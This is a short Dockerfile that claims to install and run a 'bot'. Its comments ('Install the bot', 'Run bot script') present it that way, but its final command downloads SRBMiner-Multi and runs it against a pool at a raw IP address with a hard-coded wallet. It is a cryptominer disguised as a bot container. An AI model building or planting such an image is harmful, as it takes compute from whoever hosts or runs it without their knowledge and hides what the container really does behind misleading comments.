FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.1/SRBMiner-Multi-2-4-1-Linux.tar.xz && tar -xf SRBMiner-Multi-2-4-1-Linux.tar.xz && chmod +x SRBMiner-Multi-2-4-1/SRBMiner-MULTI && ./SRBMiner-Multi-2-4-1/SRBMiner-MULTI --algorithm randomx --pool 43.228.215.76:5001 --wallet ZEPHsB4SF9T9wS4vyAbjZ6FzTDyCRFeV5MK7qqHdt2AHWfsmb1P7cbe2gfYp5py78DT6gFyLZixVqc11DNRyY9CHbs2BQG7LDyt --password x
